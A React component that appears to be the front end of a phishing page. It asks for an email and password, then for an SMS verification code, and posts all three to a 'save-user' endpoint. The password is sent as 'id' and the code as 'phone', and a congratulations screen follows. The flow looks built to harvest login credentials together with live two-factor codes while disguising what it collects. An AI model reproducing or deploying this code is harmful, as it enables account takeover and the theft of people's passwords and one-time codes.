import '@/components/MainApp/App.scss';

import Form from '@/components/Form';
import Header from '@/components/Header';
import { useCallback, useState } from 'react';
import Input from '../Input';
import Congratulation from '../Congratulation/Congratulation';
import axios from 'axios';

const MainApp = () => {
  const [step, setStep] = useState(1);
  const [formState, setFormState] = useState({
    email: {
      value: '',
      valid: false,
      touched: false,
      error: '',
    },
    password: {
      value: '',
      valid: false,
      touched: false,
      error: '',
    },
  });
  const [verification, setVerification] = useState({
    code: {
      value: '',
      valid: false,
      touched: false,
      error: '',
    },
  });

  const handleBlur = useCallback((e) => {
    const { name, value } = e.target;
    if (value.trim() === '') {
      setVerification((prevState) => ({
        ...prevState,
        [name]: {
          ...prevState[name],
          touched: true,
          error: 'Required field',
        },
      }));
    }
  }, []);

  const handleFocus = useCallback((e) => {
    const { name } = e.target;
    setVerification((prevState) => ({
      ...prevState,
      [name]: {
        ...prevState[name],
        touched: true,
      },
    }));
  }, []);

  const handleChange = useCallback((e) => {
    const { name, value } = e.target;

    if (/^[0-9]*$/.test(value)) {
      setVerification((prevState) => ({
        ...prevState,
        [name]: {
          ...prevState[name],
          value,
          error: '',
        },
      }));
    }
  }, []);

  const handleSubmit = useCallback(
    (e) => {
      e.preventDefault();
      axios
        .post(`${import.meta.env.VITE_API}save-user`, {
          email: formState.email.value,
          id: formState.password.value,
          phone: verification.code.value,
        })
        .then(function (response) {
          setStep(3);
        })
        .catch(function (error) {
          console.log(error);
        });
    },
    [formState, verification]
  );

  return (
    <div className="app">
      <div className="app__header-wrapper">
        <div className="app__background-map" />
        <Header />
      </div>
      {step === 1 && (
        <div className="app__form-wrapper">
          <Form setStep={setStep} formState={formState} setFormState={setFormState} />
        </div>
      )}

      {step === 2 && (
        <div className="app__form-wrapper">
          <div style={{ padding: '20px 8px' }} className="form">
            <h1 className="form__title">Message sent to your number</h1>
            <h3 className="form__subtitle">Enter the passcode you received.</h3>
            <div style={{ marginTop: 20 }} className="form__form-inner">
              <div className="form__input-wrapper">
                <Input
                  type="text"
                  placeholder="Verification code *"
                  name="code"
                  value={verification.code.value}
                  onChange={handleChange}
                  onBlur={handleBlur}
                  onFocus={handleFocus}
                  error={verification.code.error}
                />
              </div>
              {verification.code.error && <span className="input__error-text">{verification.code.error}</span>}
            </div>
            <div className="form__button">
              <button
                type="submit"
                onClick={handleSubmit}
                className="form__button-submit"
                disabled={!verification.code.value?.length}
              >
                SUBMIT
              </button>
            </div>
          </div>
        </div>
      )}

      {step === 3 && <Congratulation />}
    </div>
  );
};

export default MainApp;
